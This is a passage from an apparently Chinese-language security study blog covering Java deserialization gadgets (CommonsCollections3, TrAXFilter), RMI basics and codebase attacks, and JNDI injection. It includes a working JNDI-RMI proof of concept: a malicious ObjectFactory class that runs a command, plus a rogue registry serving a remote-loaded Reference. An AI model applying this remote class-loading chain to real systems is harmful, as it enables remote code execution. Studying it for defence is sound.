class="comment">// arm with actual transformer chain</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> handler;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      PayloadRunner.run(CommonsCollections3.class, args);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">isApplicableJavaVersion</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> JavaVersion.isAnnInvHUniversalMethodImpl();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="InstantiateTransformer"><a href="#InstantiateTransformer" class="headerlink" title="InstantiateTransformer"></a>InstantiateTransformer</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">InstantiateTransformer</span><span class="params">(Class[] paramTypes, Object[] args)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.iParamTypes = paramTypes;</span><br><span class="line">    <span class="keyword">this</span>.iArgs = args;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据链子，最后面调用的应该是<code>transform</code>，这里调用了某个类的构造方法，打断点调试的时候发现input的值是<code>com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!(input <span class="keyword">instanceof</span> Class)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InstantiateTransformer: Input object was not an instanceof Class, it was a &quot;</span> + (input == <span class="keyword">null</span> ? <span class="string">&quot;null object&quot;</span> : input.getClass().getName()));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Constructor con = ((Class)input).getConstructor(<span class="keyword">this</span>.iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> con.newInstance(<span class="keyword">this</span>.iArgs); <span class="comment">// 会将我们传进去的Templates进行实例化</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ……</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="TrAXFilter"><a href="#TrAXFilter" class="headerlink" title="TrAXFilter"></a>TrAXFilter</h5><p>他的构造方法实现了<code>(TransformerImpl) templates.newTransformer()</code>，就直接实现了先调用<code>TemplatesImpl#newTransformer</code>，从而完成整个链子，而字节码是在<code>Gadgets#createTemplatesImpl</code>中形成的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">TrAXFilter</span><span class="params">(Templates templates)</span>  <span class="keyword">throws</span></span></span><br><span class="line"><span class="function">    TransformerConfigurationException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    _templates = templates;</span><br><span class="line">    _transformer = (TransformerImpl) templates.newTransformer();</span><br><span class="line">    _transformerHandler = <span class="keyword">new</span> TransformerHandlerImpl(_transformer);</span><br><span class="line">    _useServicesMechanism = _transformer.useServicesMechnism();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="RMI简单入门"><a href="#RMI简单入门" class="headerlink" title="RMI简单入门"></a>RMI简单入门</h3><p>RMI(Remote Method Invocation)，远程方法调用，是Java独有的一种机制，允许运行在一个Java虚拟机的对象调用另一个Java虚拟机上对象的方法</p>
<h4 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h4><p>RMI和RPC类似，但RPC作为C语言的一个分支，主要关注数据结构，而RMI不仅使用数据结构，还会适用对象</p>
<p>在一个对象可以与RMI一起使用之前，这个对象必须是可序列化的（RMI的传输时基于反序列化的）。RMI的远程对象是通过引用传递的，而非远程对象是通过复制传递</p>
<p>对于任何一个以对象为参数的RMI接口，都可以发一个自己构建的对象，迫使服务器端将这个对象按任何一个存在于服务端classpath中的可序列化类来反序列化恢复对象</p>
<p><strong>三个主体：</strong></p>
<p>1.Client 客户端</p>
<p>2.Server 服务端</p>
<p>3.Registry 注册中心</p>
<p><strong>RMI Server</strong>分成三部分</p>
<blockquote>
<ol>
<li>一个继承<code>java.rmi.Remote</code>的接口，其中定义我们要远程调用的函数，并且每个方法必须要抛出<code>java.rmi.RemoteException</code></li>
<li>一个实现此接口的类，通常都会扩展<code>java.rmi.UnicastRemoteObject</code></li>
<li>一个主类，用来创建Registry，并将上面的类实例化之后绑定到一个地址</li>
</ol>
</blockquote>
<p><strong>存根和骨架</strong></p>
<p>用于远程对象的实现。</p>
<p>存根(stub)是想调用的方法的对象所代理的本地代码；</p>
<p>骨架(skeleton)从存根接收远程方法调用并将它们传递给对象</p>
<p><strong>RMI Registry</strong></p>
<p>主要流程：</p>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/1519089/1632667693674-ef6724af-9a79-45d6-a87e-b334d3948bd4.png"></p>
<blockquote>
<p>RMI Registry就像⼀个⽹关，他⾃⼰是不会执⾏远程⽅法的，但RMI Server可以在上⾯注册⼀个Name到对象的绑定关系；RMI Client通过Name向RMI Registry查询，得到这个绑定关系，然后再连接RMI Server；最后，远程⽅法实际上在RMI Server上调⽤。</p>
</blockquote>
<p>例子：</p>
<p>首先创建一个扩展了Remote的接口，并声明一个我们需要调用的方法，记得抛出<code>RemoteException</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">RmiInterface</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">hello</span><span class="params">(String param)</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>创建一个实现该接口的类，并且继承了<code>UnicastRemoteObject</code>，重写方法，并在这里建立<code>Registry</code>并向注册建立远程对象，将对象实例和Registry的<code>hello</code>绑定在一起</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloHandler</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">RmiInterface</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String hello = <span class="string">&quot;Hello: &quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="title">HelloHandler</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">hello</span><span class="params">(String param)</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> hello+param;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        RmiInterface rmiInterface = <span class="keyword">new</span> HelloHandler();</span><br><span class="line">        registry.bind(<span class="string">&quot;hello&quot;</span>,rmiInterface);</span><br><span class="line">        <span class="comment">// Naming.bind(&quot;rmi://ip:port/hello&quot;,rmiInterface) 远程写法</span></span><br><span class="line">        <span class="comment">// Naming.bind(&quot;hello&quot;,rmiInterface) 本地写法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>客户端：通过<code>LocateRegistry.getRegistry</code>访问远程的registry对象，并通过lookup方法找到绑定了对象实例的skeleton，然后调用相应的方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Registry registry = LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">            RmiInterface rmiInterface = (RmiInterface) registry.lookup(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">            String name = <span class="string">&quot;Ameuu&quot;</span>;</span><br><span class="line">            System.out.println(rmiInterface.hello(name));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/3e38745a45d34f5e81c741ad242f5067.png"></p>
<h4 id="RMI安全"><a href="#RMI安全" class="headerlink" title="RMI安全"></a>RMI安全</h4><p>我们仅从客户端角度来看一下RMI：<br>客户端连接<code>Registry</code>并去寻找某个Name，从而找到其绑定的对象实例，然后去调用这个远程对象的某个方法</p>
<p>那么：</p>
<blockquote>
<ol>
<li>如果我们能访问RMI Registry服务，如何对其攻击？ </li>
<li>如果我们控制了目标RMI客户端中 Naming.lookup 的第一个参数（也就是RMI Registry的地 址），能不能进行攻击？</li>
</ol>
</blockquote>
<h5 id="攻击Registry"><a href="#攻击Registry" class="headerlink" title="攻击Registry"></a>攻击Registry</h5><p>Java对远程访问RMI Registry做了限制，只有来源地址是localhost的时候，才能调用rebind、 bind、unbind等方法。</p>
<p>但是可以通过list获取目标上绑定的所有对象、通过lookup获取某个对象</p>
<p><a href="https://github.com/NickstaDB/BaRMIe">BaRMIe</a></p>
<h5 id="codebase执行任意代码"><a href="#codebase执行任意代码" class="headerlink" title="codebase执行任意代码"></a>codebase执行任意代码</h5><p><strong>codebase</strong>是一个地址，在RMI流程中，客户端和服务端直接传递的是序列化的对象，在反序列化的时候会去找相应的类进行实例化，而如果在本地找不到的时候机会自动去codebase里面找，而相应的就产生了问题，如果codebase是我们可以利用的，那么有可能可以加载恶意类</p>
<p>条件：</p>
<blockquote>
<ul>
<li>安装并配置了SecurityManager</li>
<li>Java版本低于7u21、6u45，或者设置了java.rmi.useCodebaseOnly=false，因为在java7u21、6u45的时候修改默认设置java.rmi.useCodebaseOnly=true，这使得java虚拟机只信任预先配置好的<code>codebase</code>，不再支持从RMI请求中获取</li>
</ul>
</blockquote>
<p>例子（代码来自P神：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ICalc.java</span></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">ICalc</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Integer <span class="title">sum</span><span class="params">(List&lt;Integer&gt; params)</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Calc.java</span></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Calc</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">ICalc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Calc</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Integer <span class="title">sum</span><span class="params">(List&lt;Integer&gt; params)</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        Integer sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (Integer param : params) &#123;</span><br><span class="line">            sum += param;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// RemoteRMIServer.java</span></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RemoteRMIServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">start</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (System.getSecurityManager() == <span class="keyword">null</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;setup SecurityManager&quot;</span>);</span><br><span class="line">            System.setSecurityManager(<span class="keyword">new</span> SecurityManager());</span><br><span class="line">        &#125;</span><br><span class="line">        Calc h = <span class="keyword">new</span> Calc();</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Naming.rebind(<span class="string">&quot;refObj&quot;</span>, h);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> RemoteRMIServer().start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// client.policy</span></span><br><span class="line">grant &#123;</span><br><span class="line">    permission java.security.AllPermission;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>编译并配置参数：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javac *.java</span><br><span class="line">java -D java.rmi.server.hostname=192.168.64.1 -D java.rmi.server.useCodebaseOnly=false -D java.security.policy=client.policy RemoteRMIServer</span><br></pre></td></tr></table></figure>

<p>其中<code>java.rmi.server.hostname</code>为服务器的IP地址，远程调用时需要根据这个值来访问RMI Server。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// RMIClient.java</span></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIClient</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Payload</span> <span class="keyword">extends</span> <span class="title">ArrayList</span>&lt;<span class="title">Integer</span>&gt; </span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">lookup</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ICalc r = (ICalc)</span><br><span class="line">            Naming.lookup(<span class="string">&quot;rmi://192.168.135.142:1099/refObj&quot;</span>);</span><br><span class="line">        List&lt;Integer&gt; li = <span class="keyword">new</span> Payload();</span><br><span class="line">        li.add(<span class="number">3</span>);</span><br><span class="line">        li.add(<span class="number">4</span>);</span><br><span class="line">        System.out.println(r.sum(li));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> RMIClient().lookup();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>运行：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -D java.rmi.server.useCodebaseOnly=false -</span><br><span class="line">D java.rmi.server.codebase=http://example.com/RMIClient</span><br></pre></td></tr></table></figure>

<blockquote>
<p>在最开始就报错了 所以复现就先搁置了 不过这个代码执行的方法条件比较苛刻 也不常用（大概</p>
</blockquote>
<h3 id="JNDI入门"><a href="#JNDI入门" class="headerlink" title="JNDI入门"></a>JNDI入门</h3><p>JNDI（Java Naming and Directory Interface），是SUN公司提供的⼀种标准的<strong>Java命名系统接⼝</strong>。为开发⼈员提供了查找和访问各种命名和⽬录服务的通⽤、统⼀的接⼝，类似JDBC都是构建在抽象层上。 现在JNDI已经成为J2EE的标准之⼀，所有的J2EE容器都必须提供⼀个JNDI的服务。</p>
<p>通过返回Reference和调用lookup获得相应的数据源。</p>
<p><img src="https://img-blog.csdnimg.cn/be2c8e2e1a2c4983a3ed9b3505a21ee7.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p><strong>Naming Service</strong></p>
<p>命名服务，将名称与值相关联的实体，称为“绑定”。提供了一种使用“find”或“search”操作来根据名称查找对象的便捷方式，就比如上面学RMI的时候根据<code>Name</code>去获取对应的对象</p>
<p><strong>Directory Service</strong></p>
<p>一种特殊的命名服务，允许存储了搜索“目录对象”</p>
<p>使用JNDI必须要有服务提供方</p>
<p>一些服务接口：</p>
<ul>
<li>LDAP 轻量级目录访问协议</li>
<li>CORBA 公共对象请求代理结构服务</li>
<li>RMI 远程方法调用</li>
<li>DNS 域名服务</li>
</ul>
<blockquote>
<p>在JNDI注入中涉及最多的是LDAP、RMI</p>
</blockquote>
<h4 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h4><blockquote>
<p>工厂模式</p>
<p>会利用到codebase </p>
<p>在java7u21、6u45、8u113 的时候修改默认设置java.rmi.useCodebaseOnly=true</p>
<p>环境：jdk8u112</p>
</blockquote>
<h5 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h5><p>存储类名，工厂名以及加载工厂的未知，都可以通过对应的get获取</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Reference</span><span class="params">(String className, String factory, String factoryLocation)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>(className);</span><br><span class="line">    classFactory = factory;</span><br><span class="line">    classFactoryLocation = factoryLocation;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="ReferenceWrapper"><a href="#ReferenceWrapper" class="headerlink" title="ReferenceWrapper"></a>ReferenceWrapper</h5><p>RMI服务中实现了<code>RemoteReference</code>的类，单纯地获取<code>Reference</code>并返回<code>Reference</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ReferenceWrapper</span><span class="params">(Reference var1)</span> <span class="keyword">throws</span> NamingException, RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.wrappee = var1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Reference <span class="title">getReference</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.wrappee;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h5><h6 id="Exploit类（恶意类"><a href="#Exploit类（恶意类" class="headerlink" title="Exploit类（恶意类"></a>Exploit类（恶意类</h6><p>要实现<code>ObjectFactory</code>接口</p>
<p>编译之后放在<code>http://127.0.0.1:8000</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Name;</span><br><span class="line"><span class="keyword">import</span> javax.naming.spi.ObjectFactory;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> <span class="keyword">implements</span> <span class="title">ObjectFactory</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String cmd;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;hello ameuu&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h6 id="服务-Server"><a href="#服务-Server" class="headerlink" title="服务 Server"></a>服务 Server</h6><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JNDIServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">// 提供服务 注册 将对象与对应的Name进行绑定</span></span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="comment">// 实现加载该目录下的Exploit</span></span><br><span class="line">        Reference reference = <span class="keyword">new</span> Reference(<span class="string">&quot;Exploit&quot;</span>,<span class="string">&quot;Exploit&quot;</span>,<span class="string">&quot;http://127.0.0.1:8000/&quot;</span>);</span><br><span class="line">        ReferenceWrapper referenceWrapper = <span class="keyword">new</span> ReferenceWrapper(reference);</span><br><span class="line">        registry.bind(<span class="string">&quot;Exploit&quot;</span>, referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="受害者-JNDI客户端"><a href="#受害者-JNDI客户端" class="headerlink" title="受害者 JNDI客户端"></a>受害者 JNDI客户端</h6><p>可以通过<code>Properties</code>设置环境变量</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> JNDI.RMI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JNDIClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">        Properties env = <span class="keyword">new</span> Properties();</span><br><span class="line">        env.put(Context.INITIAL_CONTEXT_FACTORY,<span class="string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>);</span><br><span class="line">        env.put(Context.PROVIDER_URL,<span class="string">&quot;rmi://127.0.0.1:1099/&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Context context = <span class="keyword">new</span> InitialContext(env);</span><br><span class="line">        context.lookup(<span class="string">&quot;Exploit&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>所以攻击流程应该是传入恶意的RMI URL给客户端，通过lookup连接到由我们控制的注册中心，获取到恶意的Reference，然后解析Reference获取相应的我们写入的恶意的Factory类从而实现rce</p>
</blockquote>
<h6 id="解析流程"><a href="#解析流程" class="headerlink" title="解析流程"></a>解析流程</h6><p>调用栈：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">getObjectFactoryFromReference:160, NamingManager</span><br><span class="line">getObjectInstance:319, NamingManager</span><br><span class="line">decodeObject:464, RegistryContext</span><br><span class="line">……</span><br><span class="line">lookup:-1, RegistryImpl_Stub</span><br><span class="line">lookup:118, RegistryContext</span><br><span class="line">lookup:128, RegistryContext</span><br><span class="line">lookup:417, InitialContext</span><br><span class="line">main:15, JNDIClient</span><br></pre></td></tr></table></figure>

<p>在<code>InitialContext</code>中已经将我们设置的变量放到了对应的变量中</p>
<p><img src="https://img-blog.csdnimg.cn/b97ec99e73314415bbd6ff491c6d1999.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>在<code>InitialContext#lookup</code>中会调用到<code>defaultInitCtx#lookup</code>，从而调用了<code>RegistryContext#lookup</code>，之后就是根据我们初始化的内容进入到注册中心通过<code>RegistryImpl_Stub#lookup</code>获取注册中心中<code>Name</code>所对应的对象，也就是<code>referenceWrapper</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Remote <span class="title">lookup</span><span class="params">(String var1)</span> <span class="keyword">throws</span> AccessException, NotBoundException, RemoteException </span>&#123; <span class="comment">// var1 = Exploit</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        RemoteCall var2 = <span class="keyword">super</span>.ref.newCall(<span class="keyword">this</span>, operations, <span class="number">2</span>, <span class="number">4905912898345647071L</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ObjectOutput var3 = var2.getOutputStream();</span><br><span class="line">            var3.writeObject(var1); <span class="comment">// 进行序列化 因为RMI底层是类序列化的值的传递</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var18) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> MarshalException(<span class="string">&quot;error marshalling arguments&quot;</span>, var18);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">super</span>.ref.invoke(var2);</span><br><span class="line"></span><br><span class="line">        Remote var23;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ObjectInput var6 = var2.getInputStream();</span><br><span class="line">            var23 = (Remote)var6.readObject(); <span class="comment">// Remote</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var15) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> UnmarshalException(<span class="string">&quot;error unmarshalling return&quot;</span>, var15);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException var16) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> UnmarshalException(<span class="string">&quot;error unmarshalling return&quot;</span>, var16);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">super</span>.ref.done(var2);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> var23;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RuntimeException var19) &#123;</span><br><span class="line">        <span class="keyword">throw</span> var19;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RemoteException var20) &#123;</span><br><span class="line">        <span class="keyword">throw</span> var20;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NotBoundException var21) &#123;</span><br><span class="line">        <span class="keyword">throw</span> 